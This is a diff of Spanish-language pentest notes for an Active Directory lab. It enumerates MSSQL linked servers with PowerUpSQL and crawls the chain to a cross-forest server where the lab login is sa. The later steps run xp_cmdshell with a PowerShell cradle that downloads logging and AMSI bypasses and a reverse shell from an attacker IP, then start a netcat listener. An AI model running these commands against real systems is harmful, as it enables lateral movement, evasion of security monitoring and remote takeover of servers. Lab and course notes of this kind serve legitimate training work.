@@ -10,24 +10,86 @@ Tags: #AD #MSSQL
 ## Enumeración 
 
 ```powershell 
-❯ Import-Module .\PowerUpSQL.psd1     # Importar la tool 
+❯ Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1     # Importar la tool 
 ```
 
 ```powershell 
 ! Usuario: Usuario de dominio
 
 Paso 1:
-❯ Get-SQLInstanceDomain -Verbose 
-# Enumerar instancias de SQL Server en el dominio via SPN Scanning — identifica servidores MSSQL registrados en AD.
+❯ Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
+# Enumerar instancias de SQL Server en el dominio via SPN Scanning — identifica servidores MSSQL registrados en AD
+
+
+	# Obtenemos 
+	ComputerName        : dcorp-mssql.dollarcorp.moneycorp.local     !IMPORTANTE
+	Instance            : DCORP-MSSQL                                !IMPORTANTE
+	DomainName          : dcorp
+	ServiceProcessID    : 1896
+	ServiceName         : MSSQLSERVER
+	ServiceAccount      : NT Service\MSSQLSERVER
+	AuthenticationMode  : Windows and SQL Server Authentication
+	ForcedEncryption    : 0
+	Clustered           : No
+	SQLServerVersionNumber  : 15.0.2000.5
+	SQLServerMajorVersion   : 2019
+	SQLServerEdition    : Developer Edition (64-bit)
+	SQLServerServicePack    : RTM
+	OSArchitecture      : X64
+	OsVersionNumber     : SQL
+	Currentlogin        : dcorp\studentx                             !IMPORTANTE
+	IsSysadmin          : No
+	ActiveSessions      : 1
+
+
+```
+
+```powershell 
+Paso 2: 
+- Conectarse con 'heidisql.exe' a la base de datos MSSQL
+```
+
+![[Pasted image 20260606144158.png]]
+
+```powershell 
+Paso 3:
+
+# Ejecutar la Query
+❯ select * from master..sysservers
+```
+
+![[Pasted image 20260606144420.png]]
+
+```powershell 
+Paso 4:
+
+# Ejecutar la Query
+❯ select * from openquery("DCORP-SQL1",'select * from master..sysservers')
+```
+
+![[Pasted image 20260606144649.png]]
+
+```powershell 
+Paso 5:
+
+# Ejecutar la Query
+❯ select * from openquery("DCORP-SQL1",'select * from openquery("DCORP-MGMT",''select * from master..sysservers'')')
+```
+
+![[Pasted image 20260606144728.png]]
+
+
+```powershell 
+! Usuario: Usuario de dominio
 
 ❯ Get-SQLConnectionTestThreaded
 # Verificar accesibilidad a instancias SQL Server usando el usuario actual.
 
-Paso 2:
+Paso (Checar):
 ❯ Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
 # Enumerar instancias SQL del dominio y verificar accesibilidad a todas ellas en paralelo.
 
-Paso 3:
+Paso (Checar):
 ❯ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Enumerar instancias SQL del dominio y recopilar información detallada de cada servidor — versión, nombre, usuario conectado, etc.
 	- `ComputerName`        → el servidor MSSQL es 'dcorp-mssql.dollarcorp.moneycorp.local'
@@ -48,7 +110,7 @@ Nota: El dato clave es 'IsSysadmin: No' — eso define qué puedes y qué no pue
 ```powershell 
 ! Usuario: Usuario de dominio con acceso a la instancia SQL
 
-Paso 4:
+Paso (Checar):
 ❯ Get-SQLServerLink -Instance dcorp-mssql -Verbose
 # Enumerar database links configurados en la instancia MSSQL — identifica servidores remotos enlazados para movimiento lateral vía linked servers.
 	- `DatabaseLinkName: DCORP-SQL1` → hay un link hacia 'dcorp-sql1' — este es el 'servidor B' de tu diagrama
@@ -72,11 +134,48 @@ Paso 4:
 ```powershell 
 ! Usuario: Usuario de dominio con acceso a la instancia SQL
 
-Paso 5:
-❯ Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
+Paso 6:
+❯ Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
 # Enumerar automáticamente toda la cadena de database links desde dcorp-mssql — descubre todos los servidores enlazados de forma recursiva incluyendo los links anidados hacia eurocorp.
+	
+	
+	# Obtenemos 
+	Version     : SQL Server 2019
+	Instance    : DCORP-MSSQL
+	CustomQuery :
+	Sysadmin    : 0
+	Path        : {DCORP-MSSQL}            !IMPORTANTE
+	User        : dcorp\student892         !IMPORTANTE
+	Links       : {DCORP-SQL1}             !IMPORTANTE
+	
+	Version     : SQL Server 2019
+	Instance    : DCORP-SQL1
+	CustomQuery :
+	Sysadmin    : 0
+	Path        : {DCORP-MSSQL, DCORP-SQL1}    !IMPORTANTE
+	User        : dblinkuser                   !IMPORTANTE
+	Links       : {DCORP-MGMT}                 !IMPORTANTE
+	
+	Version     : SQL Server 2019
+	Instance    : DCORP-MGMT
+	CustomQuery :
+	Sysadmin    : 0
+	Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}   !IMPORTANTE
+	User        : sqluser                                 !IMPORTANTE
+	Links       : {EU-SQL35.EU.EUROCORP.LOCAL}            !IMPORTANTE
+	
+	Version     : SQL Server 2019
+	Instance    : EU-SQL35
+	CustomQuery :
+	Sysadmin    : 1
+	Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL35.EU.EUROCORP.LOCAL}   !IMPORTANTE
+	User        : sa                                                                  !IMPORTANTE
+	Links       :                                                                     !IMPORTANTE
+
+
+	# Donde:
 	PATH: DCORP-MSSQL → DCORP-SQL1 → DCORP-MGMT → EU-SQL1.EU.EUROCORP.LOCAL
-	- DCORP-MSSQL   → login: `dcorp\student1` — IsSysAdmin: '0' (público)
+	- DCORP-MSSQL   → login: `dcorp\student892` — IsSysAdmin: '0' (público)
 	- DCORP-SQL1    → login: `dblinkuser` — IsSysAdmin: '0' (sin privilegios)
 	- DCORP-MGMT    → login: `sqluser` — IsSysAdmin: '0' (sin privilegios)
 	- EU-SQL1       → login: `sa` — IsSysAdmin: '1' ← aquí está el premio
@@ -98,17 +197,72 @@ Nota: En EU-SQL1 (otro bosque — eu.eurocorp.local) eres 'sa' (sysadmin total).
 ```powershell 
 ! Usuario: Usuario de dominio con acceso sa en otro mssql via linked servers
 
-Paso 6:
+NOTA: Si en EU-SQL35 está habilitado xp_cmdshell, se puede ejecutar comandos del sistema operativo Windows desde SQL Server como en el siguiente comando:
+
+Paso 7:
+❯ Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local  -Query "exec master..xp_cmdshell 'set username'"
+# Ejecutar un comando OS en eu-sql específicamente usando -QueryTarget — sin este parámetro intentaría ejecutar xp_cmdshell en todos los servidores de la cadena
+
+
+	# Obtenemos 
+	Version     : SQL Server 2019
+	Instance    : DCORP-MSSQL
+	CustomQuery :
+	Sysadmin    : 0
+	Path        : {DCORP-MSSQL}
+	User        : dcorp\student892
+	Links       : {DCORP-SQL1}
+	
+	Version     : SQL Server 2019
+	Instance    : DCORP-SQL1
+	CustomQuery :
+	Sysadmin    : 0
+	Path        : {DCORP-MSSQL, DCORP-SQL1}
+	User        : dblinkuser
+	Links       : {DCORP-MGMT}
+	
+	Version     : SQL Server 2019
+	Instance    : DCORP-MGMT
+	CustomQuery :
+	Sysadmin    : 0
+	Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
+	User        : sqluser
+	Links       : {EU-SQL35.EU.EUROCORP.LOCAL}
+	
+	Version     : SQL Server 2019                         !IMPORTANTE
+	Instance    : EU-SQL35                                !IMPORTANTE
+	CustomQuery : {USERNAME=SYSTEM, }                     !IMPORTANTE
+	Sysadmin    : 1                                       !IMPORTANTE
+	Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL35.EU.EUROCORP.LOCAL}   !IMPORTANTE
+	User        : sa                                      !IMPORTANTE
+	Links       :                                         !IMPORTANTE
+
+
+
 ❯ Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql
 ❯ Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'cmd /c set username'" -QueryTarget eu-sql
-# Ejecutar un comando OS en eu-sql específicamente usando -QueryTarget — sin este parámetro intentaría ejecutar xp_cmdshell en todos los servidores de la cadena.
 
-❯ Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql1
+```
+
+```powershell 
+Paso 8:
+! Utilizar Invoke-PowerShellTcp.ps1, renombrarlo como Invoke-PowerShellTcpEx.ps1 y compartirlo con 'HFS'
+# Editar el archivo y agregar el siguiente comando al final:
+❯ Power -Reverse -IPAddress 172.16.100.X -Port 443
+
+Paso 9:
+❯ Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.x/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.x/Amsi-Byp.txt);iex (iwr -UseBasicParsing http://172.16.100.x/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sqlx
 # Ejecutar un cradle de PowerShell en eu-sql1 via xp_cmdshell para cargar bypass de logging, bypass de AMSI y una reverse shell — obtiene ejecución de código en el servidor del otro bosque (eu.eurocorp.local)
-
 
 ❯ select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami"'''')'')')
 # Ejecutar comandos OS en eu-sql encadenando openquery anidados manualmente desde dcorp-mssql — recorre toda la cadena dcorp-mssql → dcorp-sql1 → dcorp-mgmt → eu-sql para ejecutar whoami via xp_cmdshell.
+
+Paso 10:
+❯ C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443      
+# Ejecutar el listener 
+	
+	❯ $env:username
+	❯ $env:computername
 ```
 
 ## Volcar LSASS manera segura de otro MSSQL vía Linked Servers 
